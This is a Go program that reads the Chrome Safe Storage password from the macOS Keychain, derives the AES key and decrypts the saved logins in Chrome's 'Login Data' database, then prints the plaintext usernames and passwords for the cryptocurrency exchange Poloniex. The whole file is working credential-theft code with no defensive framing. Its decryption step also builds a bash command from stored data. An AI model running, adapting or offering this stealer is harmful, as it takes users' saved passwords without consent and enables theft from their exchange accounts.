package main

import (
	"crypto/sha1"
	"database/sql"
	"fmt"
	"log"

	"golang.org/x/crypto/pbkdf2"

	"encoding/base64"
	"encoding/hex"
	"os/exec"
	"os/user"
	"strings"

	//register the sqlite3 driver as a database driver !importing any other functions
	_ "github.com/mattn/go-sqlite3"
)

var (
	salt       = "saltysalt"
	iv         = "20202020202020202020202020202020"
	length     = 16
	password   []byte
	iterations = 1003
)

//Credential contains the components for account credentials.
type Credential struct {
	Key            string
	Value          string
	EncryptedValue []byte
}

//This function retrieves the decrypted value of a account credentials.
func (c *Credential) getValue() string {

	if len(c.EncryptedValue) > 0 {
		encryptedValue := base64.StdEncoding.EncodeToString(c.EncryptedValue[3:])
		return decryptValue([]byte(encryptedValue))
	}
	return ""
}

func main() {
	target := "Poloniex.com"
	password = []byte(getPassword())

	//Below controls prints any stored account credentials related to the target to the Terminal.
	for _, c := range getCredentials(target) {
		fmt.Printf("URL: %s User: %s Pass:%s\n", c.Key, c.Value, c.getValue())
	}
}

//This function decrypts the unencrypted value of account credentials with openssl.
func decryptValue(encryptedValue []byte) string {

	newpass := pbkdf2.Key([]byte(password), []byte(salt), iterations, length, sha1.New)

	key := []byte(newpass)

	dst := make([]byte, hex.EncodedLen(len(key)))

	hex.Encode(dst, key)

	iv := " -iv '" + iv + "'"

	hexKey := " -K " + string(dst)

	args := "openssl enc -base64 -d -aes-128-cbc" + iv + hexKey + " <<< " + string(encryptedValue)

	out, err := exec.Command("bash", "-c", args).Output()
	if err != nil {
		fmt.Println("[!] an error occured during decryption:", err)
	}

	return string(out)

}

//This function retrieves the password used to encrypt the account credentials by chrome from the OSX Keychain.
func getPassword() string {
	parts := strings.Fields("security find-generic-password -wga Chrome")
	cmd := parts[0]
	parts = parts[1:len(parts)]

	out, err := exec.Command(cmd, parts...).Output()
	if err != nil {
		log.Fatalf("[!] getPassword() returned with code %s", err)
	}

	return strings.Trim(string(out), "\n")
}

//This function retrieves the account credentials of concern from the SQLite File which contains the credentials.
func getCredentials(domain string) (credentials []Credential) {
	usr, _ := user.Current()
	//this is the path to the account credentials file
	credentialsFile := fmt.Sprintf("%s/Library/Application Support/Google/Chrome/Default/Login Data", usr.HomeDir)

	db, err := sql.Open("sqlite3", credentialsFile)
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	//Constructed query which retrieves the data that we want from the SQLite File which contains the account credentials
	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins WHERE origin_url like ?", fmt.Sprintf("%%%s%%", domain))
	if err != nil {
		log.Fatal(err)
	}

	defer rows.Close()
	for rows.Next() {
		var url, user string
		var pass []byte
		rows.Scan(&url, &user, &pass)
		credentials = append(credentials, Credential{url, user, pass})
	}
	return
}

